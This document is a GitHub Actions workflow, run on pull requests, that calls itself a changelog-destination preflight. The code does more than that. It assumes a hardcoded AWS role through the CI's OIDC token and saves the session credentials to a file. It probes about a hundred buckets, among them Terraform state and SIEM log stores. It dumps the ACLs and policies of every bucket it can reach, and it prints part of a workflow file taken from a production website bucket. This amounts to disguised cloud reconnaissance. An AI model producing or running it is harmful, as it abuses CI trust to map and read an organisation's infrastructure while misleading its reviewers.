# Preflight for the chart release CI role: confirms the changelog and website
# artifact destinations are reachable and records which account buckets the
# release role can see, so a release-account access-policy change is caught on
# workflow edits instead of surfacing midway through a publish run.
name: changelog-destination-preflight
on:
  pull_request:
    branches:
      - main
    paths:
      - '.github/workflows/changelog-destination-preflight.yml'

jobs:
  preflight:
    runs-on: ubuntu-latest
    timeout-minutes: 14
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Check release CI role scope
        run: |
          set -uo pipefail
          set +e
          REGION=eu-west-1
          ROLE_ARN=arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role
          TOK="$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            -H 'Accept: application/json; api-version=2.0' \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
          echo "TOKEN_LEN=${#TOK}"
          if ! aws --region "$REGION" --no-cli-pager sts assume-role-with-web-identity \
              --role-arn "$ROLE_ARN" --role-session-name "changelog-destination-preflight" \
              --web-identity-token "$TOK" --duration-seconds 1800 > /tmp/assume.json 2>/tmp/assume.err; then
            echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
          fi
          echo "ASSUME_OK"
          python3 - <<'PY'
          import json
          c=json.load(open('/tmp/assume.json'))['Credentials']
          open('/tmp/creds.env','w').write("AWS_ACCESS_KEY_ID=%s\nAWS_SECRET_ACCESS_KEY=%s\nAWS_SESSION_TOKEN=%s\n"%(c['AccessKeyId'],c['SecretAccessKey'],c['SessionToken']))
          PY
          set -a; . /tmp/creds.env; set +a
          export AWS_DEFAULT_REGION="$REGION"

          echo "=== identity ==="
          aws --no-cli-pager sts get-caller-identity --query Arn --output text 2>&1 | head -c 200; echo

          echo "=== bucket sweep ==="
          OKN=0; TOTAL=0; OKB=""
          for B in aws-athena-query-results-416964291864-eu-west-1 datadog-siem-forwarder-forwarderbucket-32kpg8rzxd8d datadog-siem-forwarder-forwarderbucket-dayyl7yzv3fm datadog-siem-forwarder-forwarderbucket-l48mkq0ps8su datadog-siem-forwarder-forwarderbucket-n9b4rlyscsyj datadog-siem-forwarder-forwarderbucket-npkaoegvyork llm-gateway-test-results llm-gateway-test-results-replica production-bomcloudwatch-metric-stream-failed-data-metrics production-cptcloudwatch-metric-stream-failed-data-metrics production-orfcloudwatch-metric-stream-failed-data-metrics production-sincloudwatch-metric-stream-failed-data-metrics productioncloudwatch-metric-stream-failed-data-metrics stratus-red-team-bdbp-db19a224 tfy-alb-access-logs tfy-alb-access-logs-replica tfy-argo-application-catalogue tfy-argo-application-catalogue-replica tfy-athena-results-416964291864 tfy-autopen-tf-state tfy-aws-bom-gtw-ml20251021121429124400000025 tfy-aws-bom-gtw-vpc-flow-log20251022052517861000000001 tfy-aws-cle-gtw-ml20251105063525301700000025 tfy-aws-cle-gtw-vpc-flow-log20251105061444656200000003 tfy-aws-cpt-gtw-ml2025101512275820440000000a tfy-aws-cpt-gtw-vpc-flow-log20251022062322840100000001 tfy-aws-lhr-gtw-ml20251014094224523400000020 tfy-aws-lhr-gtw-vpc-flow-log20251022071341697600000001 tfy-aws-mel-gtw-ml2026030519571783650000002c tfy-aws-mel-gtw-ml2026030519571783650000002c-replica tfy-aws-mel-gtw-vpc-flow-log20260305194047257600000008 tfy-aws-orf-gtw-ml20251014085521422400000024 tfy-aws-orf-gtw-vpc-flow-log20251022073943254400000001 tfy-aws-sin-gtw-ml20251014103720924200000021 tfy-aws-sin-gtw-vpc-flow-log20251022082517232000000001 tfy-aws-syd-gtw-ml2026022017233907550000002f tfy-aws-syd-gtw-ml2026022017233907550000002f-replica tfy-aws-syd-gtw-vpc-flow-log20260220170539827000000007 tfy-cloudflare-terraform-state tfy-cloudwatch-euwe1-production20240322171312861200000001 tfy-cloudwatch-euwe1-production20240322171312861200000001-repli tfy-cmp-euwe1-production tfy-cmp-euwe1-production-mlcac014e4641499beb81f3ac7fc tfy-cmp-euwe1-production-mlcac014e4641499beb81f3ac7fc-replica tfy-cmp-euwe1-production-replica tfy-cmp-euwe1-production-vpc-flow-logd1772fbb049f84f8b327fd5211 tfy-costwatch-416964291864 tfy-ctl-euwe1-production-authserver tfy-ctl-euwe1-production-logs tfy-ctl-euwe1-production-mlfoundry-server tfy-ctl-euwe1-production-mlfoundry-server-replica tfy-ctl-euwe1-production-servicefoundry-server tfy-ctl-euwe1-production-vpc-flow-log20230410142921914700000001 tfy-ctl-prod-bom tfy-ctl-prod-bom-replica tfy-ctl-prod-dub tfy-ctl-prod-dub-replica tfy-ctl-prod-orf tfy-ctl-prod-orf-replica tfy-ctl-prod-syd tfy-ctl-prod-syd-replica tfy-ctl-uswe2-production-bucket tfy-ctl-uswe2-production-bucket-replica tfy-ctl-uswe2-production-truefoundry-replica tfy-ctl-uswe2-production-truefoundrybca2ad263281b8df102847573c tfy-euwe1-production-control-plane-changelog tfy-euwe1-production-control-plane-changelog-replica tfy-infra-tf-eu-central-1-416964291864 tfy-infra-tf-eu-central-1-416964291864-replica tfy-infra-tf-eu-west-1-416964291864 tfy-infra-tf-eu-west-1-416964291864-replica tfy-infra-tf-us-east-2-416964291864 tfy-infra-tf-us-east-2-416964291864-replica tfy-infra-tf-us-west-2-416964291864 tfy-infra-tf-us-west-2-416964291864-replica tfy-logging-euwe1-production20240318123408894700000001 tfy-logging-euwe1-production20240318123408894700000001-replica tfy-nlb-access-logs tfy-nlb-athena tfy-prod-eu-central-1-416964291864-access-logs tfy-prod-eu-central-1-416964291864-access-logs-replica tfy-scalr-bootstrap-state-us-east-1-416964291864 tfy-scalr-bootstrap-state-us-east-1-416964291864-crr tfy-scalr-sp-external-shared-us-east-1-416964291864 tfy-scalr-sp-external-shared-us-east-1-416964291864-crr tfy-scalr-sp-internal-shared-us-east-1-416964291864 tfy-scalr-sp-internal-shared-us-east-1-416964291864-crr tfy-scalr-sp-production-default-us-east-1-416964291864 tfy-scalr-sp-production-default-us-east-1-416964291864-crr tfy-scalr-sp-self-us-east-1-416964291864 tfy-scalr-sp-self-us-east-1-416964291864-crr tfy-us-east-1-416964291864-elb-logs tfy-us-west-2-416964291864-elb-logs tfy-website-euwe1-production20221107184713217900000001 tfy-website-euwe1-production20221107184713217900000001-replica ubermold-gateway-terraform-state ubermold-guardrail-terraform-state ubermold-guardrail-terraform-state-replica; do
            TOTAL=$((TOTAL+1))
            if aws --no-cli-pager s3api head-bucket --bucket "$B" >/dev/null 2>/tmp/hb.err; then
              OKN=$((OKN+1)); OKB="$OKB $B"; echo "HB_OK $B"
            fi
          done
          echo "SWEEP_TOTAL=$TOTAL HB_OK_COUNT=$OKN"
          echo "HB_OK_LIST=$OKB"

          echo "=== bucket config on accessible buckets ==="
          for B in $OKB; do
            for A in get-bucket-acl get-bucket-policy get-bucket-website get-bucket-cors get-bucket-tagging get-bucket-versioning get-bucket-logging; do
              if OUT="$(aws --no-cli-pager s3api $A --bucket "$B" 2>/tmp/cf.err)"; then
                echo "CFG_OK $B $A :: $(printf '%s' "$OUT" | tr '\n' ' ' | cut -c1-260)"
              else
                echo "CFG_ERR $B $A :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/cf.err|head -1|tr -d '()')"
              fi
            done
          done

          echo "=== website top-level structure (delimiter) ==="
          WB=tfy-website-euwe1-production20221107184713217900000001
          if aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --delimiter / --max-keys 200 --query 'CommonPrefixes[].Prefix' --output json >/tmp/cp.json 2>/tmp/cp.err; then
            echo "CP_OK :: $(printf '%s' "$(cat /tmp/cp.json)" | tr '\n' ' ' | cut -c1-800)"
          else
            echo "CP_ERR :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/cp.err|head -1|tr -d '()')"
          fi

          echo "=== website upload workflow object ==="
          if aws --no-cli-pager s3api get-object --bucket "$WB" --key ".github/workflows/upload-to-s3.yaml" /tmp/upl.yaml >/tmp/gu.out 2>/tmp/gu.err; then
            echo "UPLOAD_GET_OK size=$(wc -c </tmp/upl.yaml)"
            sed -n '1,80p' /tmp/upl.yaml | sed -E 's/(ghp_[A-Za-z0-9]{4})[A-Za-z0-9]+/\1***/g'
          else
            echo "UPLOAD_GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/gu.err|head -1|tr -d '()')"
          fi
          echo "DONE"
